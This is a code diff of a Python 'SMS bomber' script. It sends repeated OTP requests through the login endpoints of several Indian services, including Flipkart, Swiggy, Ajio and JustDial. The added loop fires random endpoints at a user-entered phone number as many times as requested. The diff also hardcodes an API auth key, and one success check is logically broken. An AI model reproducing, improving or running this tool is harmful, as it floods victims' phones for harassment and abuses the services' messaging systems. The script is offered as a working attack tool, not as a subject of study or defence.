@@ -2,12 +2,8 @@ import json
 import requests as rq
 import random
 
-mobno = input("Enter mobile number: ")
-quantity = int(input("Enter no of messages: "))
 
-
-
-def flipkart_api():
+def flipkart_api(mobno):
 	url = 'https://1.rome.api.flipkart.com/api/7/user/otp/generate'
 
 	_headers = {
@@ -42,7 +38,7 @@ def flipkart_api():
 			print('Failed - Flipkart')
 
 
-def unacademy_api():
+def unacademy_api(mobno):
 	url = 'https://unacademy.com/api/v3/user/user_check/'
 
 
@@ -67,18 +63,18 @@ def unacademy_api():
 	data = {"phone":""+mobno,"country_code":"IN","otp_type":1,"email":"","send_otp":'true',"is_un_teach_user":'false'}
 
 	request = rq.post(url,headers=_headers,json=data)
-
-	if request.status_code == 200:
+	response = request.json()
+	if "sms_sent" == True in response:
 		print('Success - Unacademy')
 	else:
 		print('Failed - Unacademy')
 
 
-def grofers_api():
+def grofers_api(mobno):
 	url = 'https://blinkit.com/v2/accounts/'
 
 	_headers = {
-		'auth_key':'15dbeedc29f8252229be1af586c485065c3c5b8d939d41f8aaae53ff14795b07',
+		'auth_key':'c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477',
 		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'
 	}
 
@@ -97,7 +93,7 @@ def grofers_api():
 		return False
 
 
-def confirmtkt_api():
+def confirmtkt_api(mobno):
 	url = 'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber='+mobno+'&newOtp=true&retry=false&testparamsp=true'
 	
 	requests = rq.get(url)
@@ -108,7 +104,7 @@ def confirmtkt_api():
 		print('Success - Confirmtkt')
 
 
-def swiggy_api():
+def swiggy_api(mobno):
 	url = 'https://www.swiggy.com/dapi/auth/sms-otp'
 	
 	_headers = {
@@ -159,7 +155,7 @@ def swiggy_api():
 		print('Failed - Swiggy')
 
 
-def vedantu_api():
+def vedantu_api(mobno):
 	url = 'https://user.vedantu.com/user/preLoginVerification'
 
 	_headers = {
@@ -185,7 +181,7 @@ def vedantu_api():
 		print('Failed - Vedantu')
 
 
-def justdial_api():
+def justdial_api(mobno):
 	url = 'https://www.justdial.com/functions/whatsappverification.php'
 
 	_headers = {
@@ -216,7 +212,7 @@ def justdial_api():
 		print("Failed - JustDial - Rate Exceeded!")
 
 
-def ajio_api():
+def ajio_api(mobno):
 	url = 'https://login.web.ajio.com/api/auth/generateLoginOTP'
 
 	_headers = {
@@ -240,3 +236,12 @@ def ajio_api():
 		print('Success - Ajio')
 	else:
 		print('Failed - Ajio')
+
+mobno = input("Enter mobile number: ")
+quantity = int(input("Enter no of messages: "))
+
+
+api_functions = [flipkart_api, unacademy_api, grofers_api, confirmtkt_api, swiggy_api, vedantu_api, justdial_api, ajio_api]
+for _ in range(quantity):
+    random_function = random.choice(api_functions)
+    random_function(mobno)
